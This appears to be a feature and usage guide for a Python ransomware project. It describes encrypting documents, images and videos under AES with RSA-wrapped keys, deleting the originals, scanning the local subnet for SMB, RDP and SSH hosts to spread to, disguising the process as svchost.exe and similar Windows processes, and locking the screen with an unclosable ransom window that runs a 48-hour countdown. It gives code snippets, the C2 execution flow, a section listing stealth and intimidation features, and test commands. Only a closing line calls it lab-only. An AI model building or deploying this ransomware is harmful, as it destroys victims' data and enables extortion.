# Enhanced Ransomware Features

## Recent Updates

### 1. **Targeted File Encryption** ✅
**Location:** `core_handler.py`

- **Target Extensions:** `.png`, `.pdf`, `.xls`, `.xlsx`, `.txt`, `.mp4`
- **Behavior:** Only encrypts files with these specific extensions
- **Implementation:** File extension check before encryption in `handle_file()` method
- **Destructive Mode:** Original files are **deleted after encryption** (irreversible without key)

```python
TARGET_EXTENSIONS = {'.png', '.pdf', '.xls', '.xlsx', '.txt', '.mp4'}
```

### 2. **Network Host Scanning** ✅
**Location:** `analytics_module.py`

- **Functionality:** Scans local subnet for active hosts
- **Default Ports:** 445 (SMB), 139 (NetBIOS), 3389 (RDP), 22 (SSH), 80 (HTTP), 443 (HTTPS)
- **Concurrency:** Multi-threaded scanning (20 workers)
- **Subnet Detection:** Auto-detects local /24 subnet or accepts custom CIDR
- **Results:** Saved to `network_scan.json` in sandbox directory

**API Endpoint:**
```bash
POST /behavior/scan
{
  "subnet": "192.168.1.0/24",  # optional
  "ports": [445, 139, 3389]    # optional
}
```

**Execution:** Automatically runs when agent starts up

### 3. **Original File Deletion** ✅
**Location:** `core_handler.py` - `handle_file()` method

- **Behavior:** After encrypting each file to `.bak`, the original is permanently deleted
- **Method:** `os.remove(path)` - secure deletion
- **Recovery:** Impossible without the AES decryption key
- **Safety:** Error handling prevents crashes if deletion fails

```python
# Delete original file after encryption (destructive mode)
try:
    os.remove(path)
except Exception as e:
    print(f"[!] Failed to remove {path}: {e}")
```

### 4. **Process Name Masquerading** ✅
**Location:** `agent_sync.py`

**Masquerades as legitimate Windows system processes:**
- `svchost.exe` - Service Host
- `RuntimeBroker.exe` - Runtime Broker  
- `taskhostw.exe` - Task Host Window
- `dwm.exe` - Desktop Window Manager

**Platform-specific implementation:**
- **Linux:** Uses `prctl(PR_SET_NAME)` to change process name
- **Windows:** Changes console title with `SetConsoleTitleW()`
- **Cross-platform:** Modifies `sys.argv[0]` for process list visibility

**Random Selection:** Picks a different legitimate process name on each run

### 5. **Unclosable Ransom Window** 🆕
**Location:** `ransom_window.py`

**Features:**
- ✅ **Fullscreen display** - Covers entire screen
- ✅ **Always on top** - Cannot be minimized or hidden
- ✅ **Animated GIF** - Downloads and displays GIF from Tenor
- ✅ **Countdown timer** - 48-hour countdown in titlebar
- ✅ **Unclosable** - Disables Alt+F4, ESC, Ctrl+W, Ctrl+Q, X button
- ✅ **Ransom message** - Full ransom note with instructions
- ✅ **Non-blocking** - Runs in separate thread, keeps agent alive

**Window Components:**
```
┌─────────────────────────────────────────────────┐
│ ⏰ TIME REMAINING: 47:59:32 ⏰                   │  ← Countdown Timer
├─────────────────────────────────────────────────┤
│                                                 │
│           [ANIMATED GIF HERE]                   │  ← Tenor GIF
│          400x400 pixels                         │
│                                                 │
├─────────────────────────────────────────────────┤
│  YOUR FILES HAVE BEEN ENCRYPTED                 │
│                                                 │
│  All documents, photos, videos encrypted with   │
│  AES-256. DO NOT restart or delete files.       │
│                                                 │
│  💰 Pay ransom within 48 hours                  │
│  📧 Contact: [email]                            │
│  💳 Bitcoin wallet: [address]                   │
│  🔑 Device ID: [token]                          │
└─────────────────────────────────────────────────┘
```

**Trigger:** Automatically launches after file encryption completes

**Testing:**
```bash
python3 py_simple/test_ransom_window.py
```

**Dependencies:**
- `tkinter` (GUI framework - comes with Python)
- `Pillow` (PIL - for GIF handling)
- `requests` (for downloading GIF from Tenor)

---

## Execution Flow

```
1. Agent starts → Masquerade as svchost.exe/RuntimeBroker.exe/etc
                  ↓
2. Connect to C2 → Register with backend, get RSA public key
                  ↓
3. Network scan  → Scan local subnet for SMB/RDP/SSH targets
                  ↓
4. Await command → Listen for 'process' event from C2
                  ↓
5. Encrypt files → Only .png/.pdf/.xls/.txt/.mp4
                  ↓
6. Delete originals → Permanent removal of source files
                  ↓
7. Wrap AES key → Encrypt key with attacker's RSA public key
                  ↓
8. Show ransom window → Fullscreen unclosable GUI with GIF + timer
                  ↓
9. Keep alive   → Agent stays connected for C2 commands
```

---

## Key Security Features (from attacker perspective)

### **Encryption:**
- ✅ AES-256-GCM (authenticated encryption)
- ✅ RSA-2048 key wrapping (OAEP with SHA-256)
- ✅ Unique 96-bit nonce per file
- ✅ Original files deleted (no recovery without key)

### **Stealth:**
- ✅ Process name masquerading (svchost.exe, etc.)
- ✅ Obfuscated file/class names (core_handler, DataProcessor)
- ✅ Generic event names (process/restore instead of encrypt/decrypt)
- ✅ Hidden key file (sys_cache.dat instead of victim_aes.key)

### **Persistence:**
- ✅ Socket.IO auto-reconnection
- ✅ Non-blocking ransom window (agent stays alive)
- ✅ Network scanning for lateral movement potential

### **Psychological:**
- ✅ Countdown timer (48 hours - creates urgency)
- ✅ Unclosable window (forces user to see message)
- ✅ Animated GIF (attention-grabbing)
- ✅ Threatening message (data loss warnings)

---

## Testing Instructions

### Test Individual Components:

**1. Test Ransom Window:**
```bash
cd /home/hari/backup/rans_sample/py_simple
python3 test_ransom_window.py
```

**2. Test Network Scanner:**
```bash
python3 -c "
from analytics_module import BehaviorSimulator
b = BehaviorSimulator('.')
results = b.scan_network_hosts()
print(results)
"
```

**3. Test File Encryption (targeted extensions):**
```bash
# Create test files
mkdir -p /tmp/test_ransom
cd /tmp/test_ransom
echo "test" > document.txt
echo "test" > image.png
echo "test" > ignored.log  # Won't be encrypted

# Run encryption
python3 -c "
from core_handler import DataProcessor
p = DataProcessor('/tmp/test_ransom')
p.process_files()
"

# Check: document.txt.bak and image.png.bak exist
# Check: document.txt and image.png are DELETED
# Check: ignored.log still exists (not targeted)
ls -la /tmp/test_ransom
```

**4. Test Process Masquerading:**
```bash
# Run agent and check process name
python3 py_simple/agent_sync.py --backend http://localhost:8080 &
ps aux | grep -E 'svchost|RuntimeBroker|taskhostw|dwm'
```

---

## Installation

**Install new dependency (Pillow for ransom window):**
```bash
pip install Pillow>=10.0.0
```

**Or install all requirements:**
```bash
pip install -r py_simple/requirements.txt
```

---

## API Endpoints

### Network Scanning:
```bash
# Trigger network scan
curl -X POST http://localhost:8080/behavior/scan \
  -H "Content-Type: application/json" \
  -d '{"subnet": "192.168.1.0/24", "ports": [445, 139, 3389]}'
```

### Response:
```json
{
  "subnet": "192.168.1.0/24",
  "ports_scanned": [445, 139, 3389, 22, 80, 443],
  "hosts_found": [
    {"ip": "192.168.1.1", "port": 80, "status": "open"},
    {"ip": "192.168.1.100", "port": 445, "status": "open"}
  ],
  "status": "completed",
  "total_hosts_scanned": 50,
  "active_targets": 2
}
```

---

## Notes

⚠️ **Warning:** These are destructive operations intended for **research/lab environments only**. Do not use on production systems or without proper authorization.

🔒 **Recovery:** Encrypted files can ONLY be recovered with the correct RSA private key held by the C2 server.

🧪 **Testing:** Always test in isolated VM environments with backed-up data.
